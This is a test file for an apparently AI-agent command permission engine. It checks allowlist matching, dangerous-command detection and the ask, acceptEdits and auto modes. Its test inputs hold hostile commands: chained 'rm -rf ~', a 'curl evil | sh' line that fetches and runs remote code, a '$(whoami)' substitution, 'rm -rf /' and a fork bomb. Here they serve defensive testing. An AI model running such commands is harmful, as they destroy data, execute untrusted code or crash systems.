import { describe, it, expect } from "vitest";
import { matchesAllowlist, isDangerous } from "../../src/permission/rules.js";
import { PermissionEngine } from "../../src/permission/engine.js";

describe("matchesAllowlist", () => {
  it("does prefix matching on a shell command", () => {
    expect(matchesAllowlist("npm test --watch", ["npm test"], "prefix")).toBe(true);
    expect(matchesAllowlist("npm publish", ["npm test"], "prefix")).toBe(false);
  });

  it("does glob matching on a file path", () => {
    expect(matchesAllowlist("src/app/index.ts", ["src/**"], "glob")).toBe(true);
    expect(matchesAllowlist("secrets/key.pem", ["src/**"], "glob")).toBe(false);
  });

  it("an empty allowlist matches nothing", () => {
    expect(matchesAllowlist("anything", [], "prefix")).toBe(false);
  });

  it("a command with metacharacters is rejected in prefix matching (prevents chaining bypass)", () => {
    expect(matchesAllowlist("npm test && rm -rf ~", ["npm test"], "prefix")).toBe(false);
    expect(matchesAllowlist("npm test; curl evil | sh", ["npm test"], "prefix")).toBe(false);
    expect(matchesAllowlist("npm test $(whoami)", ["npm test"], "prefix")).toBe(false);
  });

  it("a path-like exec command matches with an argument in prefix mode (no glob guessing)", () => {
    expect(
      matchesAllowlist("./scripts/build.sh --ci", ["./scripts/build.sh"], "prefix"),
    ).toBe(true);
  });
});

describe("isDangerous", () => {
  it("catches destructive commands", () => {
    expect(isDangerous("rm -rf /")).toBe(true);
    expect(isDangerous("sudo rm -rf /*")).toBe(true);
    expect(isDangerous(":(){ :|:& };:")).toBe(true);
  });
  it("treats normal commands as safe", () => {
    expect(isDangerous("npm test")).toBe(false);
    expect(isDangerous("git status")).toBe(false);
  });
});

describe("PermissionEngine", () => {
  it("safe level grants permission without asking in every mode", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "safe", preview: "read", allowKey: "x" })).toBe("allow");
  });

  it("asks for write/exec in ask mode", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("ask");
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
  });

  it("acceptEdits mode auto-allows write, asks for exec", () => {
    const eng = new PermissionEngine({ mode: "acceptEdits", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
  });

  it("auto mode allows everything automatically but still asks for a dangerous command", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("allow");
    expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
  });

  it("auto mode still asks for a dangerous command even if it's in the allowlist (dangerous wins)", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: ["rm -rf /"] });
    expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
  });

  it("an allowlist match grants permission even in ask mode", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: ["git status"] });
    expect(eng.check({ level: "exec", preview: "git status", allowKey: "git status" })).toBe("allow");
  });

  it("a rule added via addAllow takes effect on the next check", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("ask");
    eng.addAllow("ls");
    expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("allow");
  });

  it("auto mode auto-grants write permission", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
  });
});
